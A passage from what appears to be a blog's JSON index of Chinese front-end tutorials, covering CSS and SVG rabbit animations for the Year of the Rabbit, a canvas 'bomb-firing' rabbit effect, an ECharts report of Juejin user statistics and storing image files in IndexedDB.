键导航来聚焦到圆形框元素时，小兔子将张大嘴巴，同时底部升起三只不同颜色的气球，上面的祝福语也会开启颜色动画，这个动效意味着掘友们能在新年大展宏图、步步高升。效果如下： 实现 创建一个容器元素。 &lt;div class=&quot;container&quot; tabindex=&quot;0&quot;&gt;&lt;/div&gt; 设置 tabindex=&quot;0&quot;，表示该容器元素是可聚焦的，并且可以通过键盘 Tab 键导航来聚焦到该元素。 创建顶部祝福语元素。 &lt;div class=&quot;prompt&quot;&gt;大展宏兔 步步高升&lt;/div&gt; 由于是在容器元素状态变化时，改变祝福语元素的状态，所以可以使用相邻兄弟选择器 +，且要将它们 position 属性设置为 absolute，从而将容器元素排在后面显示。祝福语元素的动画状态默认 paused，当容器元素 hover 和 focus 时，动画状态变为 running。 div { position: absolute; } .prompt { top: 0; left: 0; right: 0; margin: 0 auto; text-align: center; padding: 1em; font-size: calc(1em + 1.5vw); font-weight: bold; background: linear-gradient(150deg, #9b5de5 0%, #f15bb5 20%, #fee440 40%, #00bbf9 60%, #00f5d4 80%); background-size: 20% 20%; background-color: #840b2a; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradient 5s linear infinite paused; } @keyframes gradient { 0% { background-position: 0% 0%; } 50% { background-position: 50% 50%; } 100% { background-position: 100% 100%; } } .container { top: 6em; bottom: 0; left: 0; right: 0; margin: 0 auto; width: 24em; height: 24em; background: aquamarine; border-radius: 50%; border: 1em solid #b2ffe5; overflow: hidden; filter: brightness(.9); } .container:hover+.prompt, .container:focus+.prompt { animation-play-state: running; } 创建兔子身体各个位置的元素。 &lt;!-- 身体 --&gt; &lt;div class=&quot;body&quot;&gt; &lt;!-- 眼睛 --&gt; &lt;div class=&quot;eye left&quot;&gt; &lt;div class=&quot;shine&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;eye right&quot;&gt; &lt;div class=&quot;shine&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 鼻子 --&gt; &lt;div class=&quot;nose&quot;&gt;&lt;/div&gt; &lt;!-- 嘴巴 --&gt; &lt;div class=&quot;mouth&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 耳朵 --&gt; &lt;div class=&quot;ear-left&quot;&gt; &lt;div class=&quot;inner-ear-left&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;ear-right&quot;&gt; &lt;div class=&quot;inner-ear-right&quot;&gt;&lt;/div&gt; &lt;/div&gt; 设置兔子身体各个位置的元素样式，当容器元素 hover 和 focus 时，设置嘴巴元素高度变化。 .body { top: 12em; bottom: 0; left: 0; right: 0; margin: 0 auto; width: 14em; height: 12em; border-radius: 6.5em 6.5em 5em 5em; background: #F2F2F2; z-index: 50; } .eye { top: 4em; width: 3em; height: 3em; background: #2E2E2E; border-radius: 50%; z-index: 100; } .left { left: 3em; } .right { right: 3em; } .shine { top: 0.22em; left: 0.22em; width: 1.5em; height: 1.5em; border-radius: 50%; background: white; } .nose { left: 0; right: 0; margin: 0 auto; top: 7.5em; width: 1.9em; height: 1.1em; border-radius: 50% 50% 35% 35%; background: pink; z-index: 960; } .mouth { z-index: 950; } .mouth-left { background: #fff; width: 2.6em; height: 2em; border-radius: 50%; top: 7.8em; left: 4.7em; } .mouth-right { background: #fff; width: 2.6em; height: 2em; border-radius: 50%; top: 7.8em; left: 6.7em; } .ear-left { background: #F2F2F2; height: 14em; width: 4em; border-radius: 50%; left: 6em; top: 1.6em; transform: rotate(-10deg); z-index: 10; } .inner-ear-left { left: 0; right: 0; margin: 0 auto; background: #fff; height: 10em; width: 2.6em; border-radius: 50%; top: 3em; } .ear-right { background: #F2F2F2; height: 14em; width: 4em; border-radius: 50%; right: 6em; top: 1.6em; transform: rotate(10deg); z-index: 10; } .inner-ear-right { left: 0; right: 0; margin: 0 auto; background: #fff; height: 10em; width: 2.6em; border-radius: 50%; top: 3em; } .mouth { top: 9.6em; left: 0; right: 0; margin: 0 auto; border-radius: 0 0 5em 5em; width: 2em; height: .6em; background: pink; z-index: 900; transition: height 500ms ease-in-out; } .container:hover, .container:focus { filter: brightness(1); outline: 0; } .container:hover&gt;.body&gt;.mouth, .container:focus&gt;.body&gt;.mouth { height: 1.6em; } 创建各个气球元素。 &lt;div class=&quot;balloon-1&quot;&gt; &lt;div class=&quot;inner-balloon-1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;knot-1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;line-1&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;balloon-2&quot;&gt; &lt;div class=&quot;inner-balloon-2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;knot-2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;line-2&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;balloon-3&quot;&gt; &lt;div class=&quot;inner-balloon-3&quot;&gt;&lt;/div&gt; &lt;div class=&quot;knot-3&quot;&gt;&lt;/div&gt; &lt;div class=&quot;line-3&quot;&gt;&lt;/div&gt; &lt;/div&gt; 设置各个气球元素样式，当容器元素 hover 和 focus 时，开启气球从底部升起动画。 .balloon-1 { background: red; width: 6.6em; height: 8em; left: 2em; top: 24em; border-radius: 50%; z-index: 0; } .inner-balloon-1 { background: white; opacity: 0.3; width: 5.6em; height: 7em; left: 0em; top: 0em; border-radius: 50%; } .knot-1 { background: red; clip-path: polygon(50% 0%, 0% 100%, 100% 100%); width: 1em; height: 1em; top: 7.6em; left: 0; right: 0; margin: 0 auto; } .line-1 { width: 1px; height: 6em; background: grey; top: 8.6em; left: 0; right: 0; margin: 0 auto; } .balloon-2 { background: blue; width: 6em; height: 7.4em; left: 10em; top: 24em; border-radius: 50%; z-index: 0; } .inner-balloon-2 { background: white; opacity: 0.3; width: 5em; height: 6.4em; left: 0.1em; top: 0.2em; border-radius: 50%; } .knot-2 { background: blue; clip-path: polygon(50% 0%, 0% 100%, 100% 100%); width: 1em; height: 1em; top: 7.2em; left: 0; right: 0; margin: 0 auto; } .line-2 { width: 1px; height: 6em; background: grey; top: 8.2em; left: 0; right: 0; margin: 0 auto; } .balloon-3 { background: yellow; width: 6.6em; height: 8em; left: 17em; top: 24em; border-radius: 50%; z-index: 0; } .inner-balloon-3 { background: white; opacity: 0.3; width: 5.6em; height: 7em; left: 0em; top: 0em; border-radius: 50%; } .knot-3 { background: yellow; clip-path: polygon(50% 0%, 0% 100%, 100% 100%); width: 1em; height: 1em; top: 7.6em; left: 0; right: 0; margin: 0 auto; } .line-3 { width: 1px; height: 6em; background: grey; top: 8.6em; left: 0; right: 0; margin: 0 auto; } .container:hover&gt;.balloon-1, .container:focus&gt;.balloon-1 { animation: up 3s ease-in infinite; } .container:hover&gt;.balloon-2, .container:focus&gt;.balloon-2 { animation: up 3s 300ms ease-in infinite; } .container:hover&gt;.balloon-3, .container:focus&gt;.balloon-3 { animation: up 3s -100ms ease-in infinite; } @keyframes up { to { top: -14em; } } 完整代码+码上掘金 ","link":"https://zkrisj.github.io/post/tu-liao-ge-tu-chun-css-zhi-zuo-tu-zi-qi-qiu-dong-hua/"},{"title":"「兔了个兔」来看看夜晚能聚光的🐇","content":"介绍 宠物科普：小兔是有各种颜色的，它们的眼睛也是有不一样颜色的。那是因为它们身体里有一种叫色素的东西。兔子眼睛的颜色与它们的皮毛颜色有关系，黑兔子的眼睛是黑色的，灰兔子的眼睛是灰色的，白兔子的眼睛红色的。因为兔子是夜行动物，所以它的眼睛能大量聚光，即使在微暗处也能看到东西。 下面我们来做一个 svg 动效，一群在夜晚的兔子，眼睛发射着聚光，当我们在光标悬停在 svg 元素上或通过键盘 Tab 键导航来聚焦到 svg 元素时时，将切换到白天正常的状态。 实现 定义 SVG 容器，设置视口在用户空间中的位置为 0 0，尺寸为 500 500。 &lt;svg viewBox=&quot;0 0 500 500&quot; tabIndex=&quot;0&quot;&gt; &lt;/svg&gt; 设置 tabindex=&quot;0&quot;，表示 SVG 元素是可聚焦的，并且可以通过键盘 Tab 键导航来聚焦到该元素。 定义一个公共（可重用）的 svg symbol 图形模板对象元素。 &lt;symbol id=&quot;creature&quot; viewBox=&quot;0 0 100 100&quot;&gt; &lt;/symbol&gt; 在 symbol 元素中定义兔子各个身体元素，并创建眼睛 eyes CSS 类，设置 visibility 属性为 visible。 &lt;g id=&quot;body&quot;&gt; &lt;!-- 右后腿 --&gt; &lt;path d=&quot;M80,85 C85,90 75,90 60,92S 60,85 67,83 C50,70 60,60 65,60&quot; transform=&quot;translate(-5,-1)&quot; /&gt; &lt;!-- 右前腿 --&gt; &lt;path id=&quot;limb&quot; d=&quot;M33,80C28,85 28,95 24,94 S20,85 27,77&quot; /&gt; &lt;!-- 肚子 --&gt; &lt;ellipse cx=&quot;45&quot; cy=&quot;65&quot; rx=&quot;40&quot; ry=&quot;20&quot; /&gt; &lt;!-- 左后腿 --&gt; &lt;path d=&quot;M30,45C70,30 85,50 90,70 C92.5,80 85,83 80,85 C85,90 75,90 60,92S 60,85 67,83 C50,70 60,60 65,60&quot; /&gt; &lt;!-- 左前腿 --&gt; &lt;use href=&quot;#limb&quot; x=&quot;4&quot; y=&quot;2&quot; /&gt; &lt;!-- 脑袋 --&gt; &lt;path d=&quot;M40,70C30,85 0,85 0,60 C0,50 5,45 10,40 C0,30 0,0 5,0S20,25 20,35 Q22,34 25,35 C25,25 30,-2 35,0 S38,28 35,38 C40,42 43,45 45,55&quot; /&gt; &lt;!-- 尾巴 --&gt; &lt;path d=&quot;M89,72c-2,-5 9,-7 8,-2 c1,3 -3,9 -5,7 c-1,3 -4,5 -5,-2&quot; /&gt; &lt;/g&gt; &lt;!-- 脸 --&gt; &lt;g id=&quot;face&quot;&gt; &lt;!-- 耳朵 --&gt; &lt;g fill=&quot;lightSalmon&quot; fill-opacity=&quot;0.75&quot;&gt; &lt;ellipse ry=&quot;15&quot; rx=&quot;4&quot; transform=&quot;translate(10,21)rotate(-15)&quot; /&gt; &lt;ellipse ry=&quot;14&quot; rx=&quot;3&quot; transform=&quot;translate(32,21)rotate(10)&quot; /&gt; &lt;/g&gt; &lt;!-- 鼻子 --&gt; &lt;path fill=&quot;coral&quot; stroke=&quot;lightCoral&quot; stroke-linejoin=&quot;round&quot; d=&quot;M12,65L17,65 15,69 Q17,72 20,70 Q15,73 10,70 Q13,72 15,69Z&quot; /&gt; &lt;!-- 眼睛 --&gt; &lt;g class=&quot;eyes&quot; fill=&quot;white&quot;&gt; &lt;!-- 眼圈 --&gt; &lt;g stroke=&quot;none&quot;&gt; &lt;ellipse ry=&quot;7&quot; rx=&quot;5&quot; cx=&quot;10&quot; cy=&quot;55&quot; /&gt; &lt;ellipse ry=&quot;7&quot; rx=&quot;5&quot; cx=&quot;20&quot; cy=&quot;55&quot; /&gt; &lt;/g&gt; &lt;!-- 眼珠 --&gt; &lt;g fill=&quot;#222&quot; stroke=&quot;#444&quot; stroke-width=&quot;0.5&quot;&gt; &lt;ellipse ry=&quot;3&quot; rx=&quot;2.5&quot; cx=&quot;10&quot; cy=&quot;58&quot; /&gt; &lt;ellipse ry=&quot;3&quot; rx=&quot;2.5&quot; cx=&quot;20&quot; cy=&quot;58&quot; /&gt; &lt;/g&gt; &lt;/g&gt; &lt;/g&gt; 创建组合兔子元素对象的容器，并创建 dark CSS 类，设置 visibility 属性为 hidden。通过 use 元素，根据 symbol 图形模板对象元素 id，创建多个不同颜色和尺寸的小兔子。 &lt;g class=&quot;dark&quot;&gt; &lt;!-- 白色兔子 银色轮廓 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;silver&quot; fill=&quot;white&quot; width=&quot;80&quot; height=&quot;80&quot; x=&quot;300&quot; y=&quot;20&quot; /&gt; &lt;!-- 粉色兔子 褐色轮廓 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;tan&quot; fill=&quot;pink&quot; width=&quot;100&quot; height=&quot;100&quot; x=&quot;50&quot; y=&quot;20&quot; /&gt; &lt;!-- 巧克力色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;chocolate&quot; fill=&quot;chocolate&quot; width=&quot;100&quot; height=&quot;100&quot; x=&quot;400&quot; y=&quot;100&quot; /&gt; &lt;!-- 黑色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;black&quot; fill=&quot;black&quot; width=&quot;120&quot; height=&quot;120&quot; x=&quot;200&quot; y=&quot;120&quot; /&gt; &lt;!-- 白色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;white&quot; fill=&quot;white&quot; width=&quot;120&quot; height=&quot;120&quot; x=&quot;50&quot; y=&quot;150&quot; /&gt; &lt;!-- 粉色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;pink&quot; fill=&quot;pink&quot; width=&quot;140&quot; height=&quot;140&quot; x=&quot;350&quot; y=&quot;170&quot; /&gt; &lt;!-- 灰色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;gray&quot; fill=&quot;gray&quot; width=&quot;150&quot; height=&quot;150&quot; x=&quot;70&quot; y=&quot;300&quot; /&gt; &lt;!-- 棕色兔子 --&gt; &lt;use href=&quot;#creature&quot; stroke=&quot;saddlebrown&quot; fill=&quot;saddlebrown&quot; width=&quot;160&quot; height=&quot;160&quot; x=&quot;340&quot; y=&quot;330&quot; /&gt; &lt;/g&gt; 设置默认样式：兔子元素不可见，但眼睛元素可见。svg 元素在光标悬停在元素上或通过键盘 Tab 键导航来聚焦到 svg 元素时设置 dark CSS 类的 visibility 属性为 visible，切换兔子元素为可见。 .dark { visibility: hidden; } .eyes { visibility: visible; } svg:hover .dark, svg:focus .dark { visibility: visible; } 完整代码+码上掘金 ","link":"https://zkrisj.github.io/post/tu-liao-ge-tu-lai-kan-kan-ye-wan-neng-ju-guang-de/"},{"title":"兔年让这只🐇发射💣来爆破你的所有坏运","content":"前言 Hello，掘友们好！又是一年新春之际，祝福大家兔年快乐！给大家介绍一个有趣的动效（兼容 IE），页面右下角有一只搞怪的兔子，鼠标在页面中悬停时，兔子会跟着做出不同的动作和表情。然后可以在页面中任意位置（离兔子太近不能发射，会伤到兔子😆）点击鼠标，将从兔子眼睛👀里发射炮弹，随之击中爆破的是你的霉 运、压 力、贫 穷、疾 病😮‍💨。 实现 定义一个随机文本块。 &lt;p id=&quot;p1&quot;&gt;&lt;/p&gt; 定义兔子的构造函数。 function HoverRabbit() { this.explodeImage = new Image(); this.explodeImage.src = &quot;img/explode.png&quot;; for (var i = 1; i &lt;= 6; i++) { this.images[i] = new Image(); this.images[i].src = &quot;img/s&quot; + i + &quot;.png&quot;; } if (typeof(CanvasGradient) != 'undefined') { this.canvas = document.createElement(&quot;canvas&quot;); this.canvas.width = screen.width + 100; this.canvas.height = screen.height; this.canvas.style.position = 'absolute'; this.canvas.style.left = '0px'; this.canvas.style.top = '0px'; this.canvas.style.display = 'none'; document.body.appendChild(this.canvas); this.canvas.style.position = 'fixed'; } } 定义兔子原型的属性和方法。 HoverRabbit.prototype = { images: [], explodeImage: null, eyePositions: [], current: 1, frame: 1, canvas: null, interval: null, start: function() { var me = this; this.eyePositions[1] = { eye1x: 123, eye1y: 47, eye2x: 104, eye2y: 53 }; this.eyePositions[2] = { eye1x: 120, eye1y: 50, eye2x: 101, eye2y: 54 }; this.eyePositions[3] = { eye1x: 119, eye1y: 54, eye2x: 97, eye2y: 56 }; this.eyePositions[4] = { eye1x: 112, eye1y: 61, eye2x: 90, eye2y: 61 }; this.eyePositions[5] = { eye1x: 105, eye1y: 64, eye2x: 85, eye2y: 61 }; this.eyePositions[6] = { eye1x: 98, eye1y: 68, eye2x: 79, eye2y: 56 }; document.onmousemove = function(e) { me.onmousemove(e); } if (this.canvas) { document.addEventListener(&quot;click&quot;, function(e) { me.ondblclick(e); }); } }, onmousemove: function(e) { var event = e || window.event; var deg = Math.abs(screen.height - event.screenY) / (Math.abs(screen.width - event.screenX) + 1); var n = 1; if (deg &gt; 2) n = 6; else if (deg &gt; 1.4) n = 5; else if (deg &gt; 0.7) n = 4; else if (deg &gt; 0.45) n = 3; else if (deg &gt; 0.2) n = 2; this.deg = n; if (this.current != n) { document.body.style.backgroundImage = &quot;url(&quot; + this.images[n].src + &quot;)&quot;; this.current = n; } }, drawBomb: function(ctxt, n, x, y) { var sx = 64 * (n % 4); var sy = 64 * (Math.floor(n / 4)); ctxt.drawImage(this.explodeImage, sx, sy, 64, 64, x - 32, y - 32, 64, 64); }, ondblclick: function(e) { if (this.canvas.style.display != 'none') return; var me = this; if (e.clientX &gt; window.innerWidth - 200 &amp;&amp; e.clientY &gt; window.innerHeight - 200) return; var ctxt = this.canvas.getContext(&quot;2d&quot;); this.frame = 1; this.interval = setInterval(function(e2) { ctxt.clearRect(0, 0, me.canvas.width, me.canvas.height); switch (me.frame) { case 1: ctxt.strokeStyle = 'rgba(247,166,71,1)'; me.canvas.style.display = 'block'; case 2: if (me.frame == 2) { ctxt.strokeStyle = 'rgba(247,166,71,0.5)'; me.drawBomb(ctxt, 0, e.clientX, e.clientY); } case 3: if (me.frame == 3) { ctxt.strokeStyle = 'rgba(247,166,71,0.1)'; me.drawBomb(ctxt, 1, e.clientX, e.clientY); } var eye1x = window.innerWidth - me.eyePositions[me.current].eye1x; var eye1y = window.innerHeight - me.eyePositions[me.current].eye1y; ctxt.lineWidth = 3; ctxt.beginPath(); ctxt.moveTo(eye1x, eye1y); ctxt.lineTo(e.clientX, e.clientY); ctxt.stroke(); var eye2x = window.innerWidth - me.eyePositions[me.current].eye2x; var eye2y = window.innerHeight - me.eyePositions[me.current].eye2y; ctxt.beginPath(); ctxt.moveTo(eye2x, eye2y); ctxt.lineTo(e.clientX, e.clientY); p1.textContent = ['霉 运', '压 力', '贫 穷', '疾 病'][Math.floor(Math.random() * 4)]; p1.style.display = 'block'; p1.style.transform = 'rotate(' + (-150 + me.deg * 30) + 'deg)'; p1.style.left = e.clientX - 30 + 'px'; p1.style.top = e.clientY - 30 + 'px'; fade(p1); ctxt.stroke(); break; case 4: me.drawBomb(ctxt, 2, e.clientX, e.clientY); break; case 14: me.canvas.style.display = 'none'; window.clearInterval(me.interval); break; default: me.drawBomb(ctxt, me.frame - 2, e.clientX, e.clientY); } me.frame++; }, 50); } }; 各个属性和方法说明： images - 兔子不同的动作的图片数组。 explodeImage - 炮弹图片元素。 eyePositions - 兔子眼睛位置的数组。 current - 整型数字，兔子当前动作的指针。 frame - 整型数字，发射炮弹动画的帧数指针。 canvas - 画布元素。 interval - 发射炮弹动画时间间隔定时器的 interval ID。 start - 启动页面交互的方法，在这里初始化了兔子眼睛位置的数组数据，绑定页面鼠标移动事件、点击事件。 onmousemove - 定义页面鼠标移动的实现方法。 ondblclick - 定义页面鼠标点击的实现方法。 drawBomb - 定义绘制和更新炮弹动画的方法。 定义文字淡出的动画。 function fade(e) { var s = e.style; s.opacity = 1; (function hide() { (s.opacity -= .01) &lt; 0 ? s.display = &quot;none&quot; : requestAnimationFrame(hide); })(); } 创建兔子对象，调用启动交互方法。 var s = new HoverRabbit(); s.start(); 码上掘金 ","link":"https://zkrisj.github.io/post/tu-nian-rang-zhe-ge-tu-zi-fa-she-bao-po-ni-de-pi-yun/"},{"title":"使用 ECharts 制作掘金个人信息报表","content":"前言 码上掘金迎新年🎉活动开始好久了，大佬们也已经发了各种总结报告。但是我在码上掘金上面请求 api.juejin.cn 接口用户数据时报错 &quot;name&quot;:&quot;TypeError&quot;,&quot;message&quot;:&quot;Failed to fetch&quot;，通过打印 console.log(location.href) 显示为 code.devrank.cn，所以应该是跨域的问题。 所以，有些总结报告不能正常显示应该都是类似的问题。昨天终于发现茶无味的一天的作品2022年终总结互动网页，可以正常显示掘金接口的数据。 给大佬留言得到回复是请求的跨域请求的代理网站，因为发现还没有人做关于 ECharts 的报表，所以征得同意可以调用接口后，制作了一个 ECharts 掘金个人信息报表。 ECharts 报表 是百度的一个开源的数据可视化工具，一个纯 Javascript 的图表库，能够在 PC 端和移动设备上流畅运行，兼容当前绝大部分浏览器。 引入 ECharts 虽然我们大部分使用 ECharts 是在 node 项目中，但为了简单，这里通过 CDN 链接的方式引入。 https://cdn.staticfile.org/echarts/4.7.0/echarts.min.js 准备容器 使用 Echarts 绘制图表前需要先有一个有宽高的 DOM 容器，代码如下： &lt;div id=&quot;main&quot; style=&quot;width: 600px; height: 400px;&quot;&gt;&lt;/div&gt; &lt;div id=&quot;main2&quot; style=&quot;width: 600px; height: 400px;&quot;&gt;&lt;/div&gt; &lt;div id=&quot;main3&quot; style=&quot;width: 100%;height: 400px;&quot;&gt;&lt;/div&gt; 以上定义了三个容器，一个饼图用来显示掘金账号信息，一个饼图用来显示用户的创作信息，一个柱图用来显示用户阅读量前十文章的阅读量、点赞、收藏、评论数量。 初始化容器 然后就可以通过 echarts.init 方法初始化 echarts 实例。 const myChart = echarts.init(document.getElementById('main')); const myChart2 = echarts.init(document.getElementById('main2')); const myChart3 = echarts.init(document.getElementById('main3')); 开启 loading 效果 如果数据获取需要一定时间，我们可以使用 ECharts 的 loading 效果。 myChart.showLoading(); myChart2.showLoading(); myChart3.showLoading(); 获取掘金 ID 通过 prompt 函数获取输入的掘金 ID，这里设置了默认值为我自己的。 const id = prompt('请输入您的掘金 ID', '2208296065832264'); 获取数据 通过浏览器的 fetch 方法来获取代理网站的掘金网站接口数据。 fetch('https://juejin.palxp.com/user?id=' + id).then(res =&gt; res.json()) 在请求数据成功时，隐藏 loading 效果。 myChart.hideLoading(); myChart2.hideLoading(); myChart3.hideLoading(); const { list, user } = res.result; const collect_count = list.map(x =&gt; +x.collect_count).reduce((a, b) =&gt; a + b, 0); const { digg, view, fans, follow, power, name } = user; 各个字段的说明： list - 文章列表。 user - 用户信息。 collect_count - 由于没有收藏总数这个字段，所以根据每篇文章的收藏数叠加得到收藏总数。 digg - 文章点赞总数。 view - 文章浏览总数。 fans - 用户关注者数量。 follow - 用户关注数量。 power - 用户掘力值。 name - 掘金用户名。 对文章列表根据阅读量排序，截取阅读量前十的文章。 const ten = list.sort((a, b) =&gt; b.view_count - a.view_count).slice(0, 10); 配置信息 使用 json 格式来设置配置信息。 const option = { title: { text: name + ' 账号信息', x: 'center' }, tooltip: { formatter: &quot;{a} &lt;br/&gt;{b} : {c} ({d}%)&quot; }, series: [{ name: name + ' 账号信息', type: 'pie', radius: '55%', data: [{ name: '关注者', value: fans }, { name: '关注', value: follow }, { name: '掘力值', value: power }] }] }; const option2 = { title: { text: name + ' 创作信息', x: 'center' }, tooltip: { formatter: &quot;{a} &lt;br/&gt;{b} : {c} ({d}%)&quot; }, series: [{ name: name + ' 创作信息', type: 'pie', radius: '55%', data: [{ name: '获得点赞', value: digg }, { name: '获得收藏', value: collect_count }, { name: '文章被阅读', value: view }] }] }; const option3 = { title: { text: '阅读量前十文章', }, tooltip: {}, legend: { right: 0, data: ['阅读量', '点赞', '收藏', '评论'], selected: { '阅读量': false, } }, grid: { x: isMobile ? 150 : 250, }, xAxis: {}, yAxis: { data: ten.map(v =&gt; v.title), axisLabel: { textStyle: { fontSize: isMobile ? 5 : 9 } } }, series: [{ name: '阅读量', type: 'bar', data: ten.map(v =&gt; v.view_count) }, { name: '点赞', type: 'bar', data: ten.map(v =&gt; v.digg_count) }, { name: '收藏', type: 'bar', data: ten.map(v =&gt; v.collect_count) }, { name: '评论', type: 'bar', data: ten.map(v =&gt; v.comment_count) }] }; myChart.setOption(option); myChart2.setOption(option2); myChart3.setOption(option3); 各个字段的说明： title - 图表标题。 tooltip - 鼠标悬停时提示框信息。 series - 系列列表。 name - 系列名称。 type - 每个系列通过 type 决定自己的图表类型。 radius - 饼图的半径。 data - 系列的数据，name 和 value 的键值对。 由于移动端比 PC 端屏幕宽度小，所以判断一下设备，移动端设置较小的字体和坐标轴标签宽度。 const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); 由于柱图中阅读量和其他分类的数量差距比较大，所以默认隐藏阅读量数据显示，可以点击右侧类别图标切换显示。 设置循环动画 有时候我们会需要在程序里调用方法并触发图表的行为，比如显示 tooltip。ECharts 通过 dispatchAction({ type: '' }) 来触发图表行为，统一管理了所有动作，也可以根据需要去记录用户的行为路径。 function loop(myChart, option) { let currentIndex = -1; setInterval(function() { const { length } = option.series[0].data; myChart.dispatchAction({ type: 'downplay', seriesIndex: 0, dataIndex: currentIndex }); currentIndex = (currentIndex + 1) % length; myChart.dispatchAction({ type: 'highlight', seriesIndex: 0, dataIndex: currentIndex }); myChart.dispatchAction({ type: 'showTip', seriesIndex: 0, dataIndex: currentIndex }); }, 1000); } 这里我们通过 setInterval 函数循环触发三个 Action。 downplay - 取消高亮指定的数据图形。 highlight - 高亮指定的数据图形。 showTip - 有下面两种使用方式。 指定在相对容器的位置处显示提示框。 dispatchAction({ type: 'showTip', // 屏幕上的 x 坐标 x: number, // 屏幕上的 y 坐标 y: number, // 本次显示 tooltip 的位置。只在本次 action 中生效。 // 缺省则使用 option 中定义的 tooltip 位置。 position: Array.&lt;number&gt;|string|Function }) 根据 tooltip 的配置项显示提示框。 dispatchAction({ type: 'showTip', // 系列的 index，在 tooltip 的 trigger 为 axis 的时候可选。 seriesIndex?: number, // 数据的 index，如果不指定也可以通过 name 属性根据名称指定数据 dataIndex?: number, // 可选，数据名称，在有 dataIndex 的时候忽略 name?: string, // 本次显示 tooltip 的位置。只在本次 action 中生效。 // 缺省则使用 option 中定义的 tooltip 位置。 position: Array.&lt;number&gt;|string|Function, }) 码上掘金 ","link":"https://zkrisj.github.io/post/shi-yong-echarts-zhi-zuo-jue-jin-ge-ren-xin-xi-bao-biao/"},{"title":"前端本地存储数据库 IndexedDB 存储文件","content":"介绍 IndexedDB 是一种浏览器底层 API，目前各浏览器都已支持，兼容性很好。 特点 IndexedDB 内部采用对象仓库（object store）存放键值对数据。可以存储结构化克隆算法支持的任何对象。每一个数据记录都有对应的主键，主键是独一无二的，并且不能有重复。 使用索引实现对数据的高性能搜索。 IndexedDB API 大部分都是异步的。不会通过返回值提供数据，而是要传递一个回调函数来获取返回值。 同大多数 Web 存储解决方案一样，IndexedDB 遵循同源策略。即可以访问相同域内存储的数据，但无法跨不同域访问数据。 可以存储文件、二进制对象。 在 Web Worker 中可用。 IndexedDB 属于 NoSQL 和事务型面向对象数据库系统。对数据库的所有操作，都要通过事务完成。 IndexedDB 允许存储和检索用键索引的对象，它可以存储结构化克隆算法支持的任何对象。 结构化克隆 结构化克隆是由 HTML5 规范定义的用于复制复杂 JavaScript 对象的算法，例如 structuredClone() 函数的调用，Workers 的 postMessage() 方法或使用 IndexedDB 存储对象时在内部的调用。结构化克隆算法使 postMessage() 在 Worker 和主线程之间不再仅仅传输字符串类型，还可以传输包括 File, Blob, ArrayBuffer, JSON 对象类型。支持的类型： symbols 除外的所有原始类型。 Boolean String 原始类型包装对象。 Array Map Set Date RegExp 内置对象。 Blob File FileList 文件类型对象。 ArrayBuffer TypedArray DataView Buffer 类型对象。 ImageBitmap ImageData 图形对象。 Object 仅包括普通对象，例如对象字面量。 Error, EvalError, RangeError, ReferenceError, SyntaxError, TypeError, URIError 错误类型，其他类型错误 name 属性会被转成 Error，message 属性会丢失。 IndexedDB 存储文件 下面我们通过在页面中定义一个文件上传按钮，选择图片文件后，会将文件保存到 IndexedDB 数据库中，当我们刷新页面，或关闭页面后，再次进入，会发现图片文件可以从 IndexedDB 数据库中读取，然后在页面中显示。 &lt;body&gt; &lt;label for=&quot;fileImg&quot;&gt;上传图片&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;fileImg&quot; accept=&quot;image/*&quot; hidden&gt; &lt;p id=&quot;result&quot;&gt;&lt;/p&gt; &lt;/body&gt; &lt;script&gt; let db; const request = indexedDB.open('the_file', 1); request.onerror = console.log; request.onsuccess = function(ev) { console.log('打开'); db = request.result; db.transaction(db.objectStoreNames).objectStore('files').openCursor().onsuccess = function(event) { const cursor = event.target.result; if (cursor) { console.log(cursor.value); const img = new Image(); img.src = URL.createObjectURL(cursor.value.file); result.append(img); cursor.continue(); } } }; request.onupgradeneeded = function(ev) { console.log('升级'); db = request.result; if (!db.objectStoreNames.contains('files')) { const table = db.createObjectStore('files', { keyPath: 'id', autoIncrement: true }); table.createIndex('file', 'file', { unique: false }); } }; fileImg.onchange = e =&gt; { const file = fileImg.files[0]; const request = db.transaction(['files'], 'readwrite').objectStore('files').add({ file }); request.onsuccess = function(event) { console.log('数据写入成功'); const img = new Image(); img.src = URL.createObjectURL(file); result.append(img); }; request.onerror = function(event) { console.log('数据写入失败'); } }; &lt;/script&gt; &lt;style&gt; label { display: inline-block; padding: 1em; border-radius: .5em; background: red; color: white; font-family: Arial, Helvetica, sans-serif } &lt;/style&gt; 码上掘金 历史相关文章 前端本地存储数据库 IndexedDB 的增删改查 前端本地存储数据库 IndexedDB 和 Web SQL、Web Storage 的对比 前端本地存储数据库 IndexedDB 的范围查询和对结果计数 ","link":"https://zkrisj.github.io/post/qian-duan-ben-di-cun-chu-shu-ju-ku-indexeddb-cun-chu-wen-jian/"},{"title":"前端本地存储数据库 IndexedDB 的范围查询和对结果计数","content":"介绍 IndexedDB 是一种浏览器底层 API，目前各浏览器都已支持，兼容性很好。 IndexedDB 内部采用对象仓库（object store）存放键值对数据。可以存储结构化克隆算法支持的任何对象。每一个数据记录都有对应的主键，主键是独一无二的，并且不能有重复。 使用索引实现对数据的高性能搜索。 IndexedDB API 大部分都是异步的。不会通过返回值提供数据，而是要传递一个回调函数来获取返回值。 同大多数 Web 存储解决方案一样，IndexedDB 遵循同源策略。即可以访问相同域内存储的数据，但无法跨不同域访问数据。 可以存储文件/二进制对象。 在 Web Worker 中可用。 IndexedDB 属于 NoSQL 